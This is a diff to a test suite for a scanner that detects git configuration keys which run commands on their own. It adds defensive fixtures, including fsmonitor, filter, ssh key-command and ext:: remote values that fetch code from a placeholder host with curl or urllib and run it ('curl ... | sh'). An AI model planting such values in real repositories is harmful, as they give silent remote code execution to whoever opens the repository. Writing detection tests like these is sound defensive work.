@@ -7,6 +7,7 @@ import os
 import stat
 import uuid
 from pathlib import Path
+from unittest import mock
 
 from stayawake.bots.security.matchers.git_exec_surface import (PAYLOAD_SIGNATURE, RUNS_SIGNATURE,
                                                                SUSPICIOUS_SIGNATURE)
@@ -228,10 +229,17 @@ class TestLegitimateToolsAreNotConfirmed(ExecSurfaceSandbox):
                                  '[include]\n\tpath = ../.gitconfig\n')
         self.assert_only_informational(repo, at_least=2)
 
-    def test_a_driver_no_attribute_selects_is_not_listed(self):
+    def test_a_driver_no_attribute_selects_is_listed(self):
         repo = self.repo()
         self.append_config(repo, '[filter "unused"]\n\tsmudge = some-tool\n')
-        self.assertEqual(self.graded(repo)[INFORMATIONAL], [])
+        self.assertEqual(["filter.unused.smudge = some-tool"],
+                         [f.evidence for f in self.graded(repo)[INFORMATIONAL]])
+
+    def test_a_credential_helper_that_asks_a_vault_is_not_confirmed(self):
+        repo = self.repo()
+        self.append_config(repo, "[credential]\n\thelper = \"!f() { echo password=$(curl -s "
+                                 "https://vault.example/token); }; f\"\n")
+        self.assertEqual([f.evidence for f in self.graded(repo)[CONFIRMED]], [])
 
     def test_a_pristine_saw_hook_is_omitted(self):
         repo = self.repo()
@@ -359,6 +367,61 @@ class TestPlantedCommandsAreCaught(ExecSurfaceSandbox):
         result = self.scan(repo)
         self.assertIsNotNone(result.error)
         self.assertIn("git configuration", result.error)
+
+
+class TestSelfFiringCommandsThatReachTheNetwork(TestPlantedCommandsAreCaught):
+    """Check a key git runs on its own whose command reaches the network, however it is spelled."""
+
+    def test_a_command_substitution(self):
+        repo = self.repo()
+        self.append_config(repo, '[core]\n\tfsmonitor = sh -c \\"$(curl -fsSL https://x.invalid)\\"\n')
+        self.assert_tier(repo, CONFIRMED)
+
+    def test_a_download_then_run(self):
+        repo = self.repo()
+        self.append_config(repo, "[core]\n\tfsmonitor = sh -c \\\"curl -o /tmp/a https://x.invalid; "
+                                 "sh /tmp/a\\\"\n")
+        self.assert_tier(repo, CONFIRMED)
+
+    def test_python_urlopen(self):
+        repo = self.repo()
+        self.append_config(repo, '[filter "x"]\n\tclean = python3 -c \\"import urllib.request as u;'
+                                 'exec(u.urlopen(1).read())\\"\n')
+        self.assert_tier(repo, CONFIRMED)
+
+    def test_a_filter_no_attribute_selects(self):
+        repo = self.repo()
+        self.append_config(repo, '[filter "x"]\n\tclean = curl -s https://x.invalid | sh\n')
+        self.assert_tier(repo, CONFIRMED)
+
+    def test_a_script_in_the_work_tree(self):
+        repo = self.repo()
+        self.hook(repo / "tools", "watch.sh", "#!/bin/sh\ncurl -s https://x.invalid | sh\n")
+        self.append_config(repo, "[core]\n\tfsmonitor = sh tools/watch.sh\n")
+        self.assert_tier(repo, CONFIRMED)
+
+    def test_the_default_ssh_key_command(self):
+        repo = self.repo()
+        self.append_config(repo, '[gpg "ssh"]\n\tdefaultKeyCommand = curl -s https://x.invalid\n')
+        self.assert_tier(repo, CONFIRMED)
+
+    def test_a_remote_address_that_is_a_command(self):
+        repo = self.repo()
+        self.append_config(repo, '[remote "origin"]\n\turl = "ext::sh -c curl% -s% https://x.invalid"\n')
+        self.assert_tier(repo, CONFIRMED)
+
+
+class TestARepositoryInAScratchDirectoryIsItsOwn(ExecSurfaceSandbox):
+    """Check a repository that itself lives under a shared scratch directory."""
+
+    def test_its_own_hooks_directory_is_not_scratch(self):
+        repo = self.repo()
+        self.append_config(repo, "[core]\n\thooksPath = .husky/_\n")
+        (repo / ".husky" / "_").mkdir(parents=True)
+        from stayawake.bots.security.matchers import git_exec_surface
+        with mock.patch.object(git_exec_surface, "_under_scratch", lambda path: True):
+            tiers = self.graded(repo)
+        self.assertEqual([f.evidence for f in tiers[HEURISTIC]], [])
 
 
 class TestReadingNeverRunsTheConfiguration(ExecSurfaceSandbox):
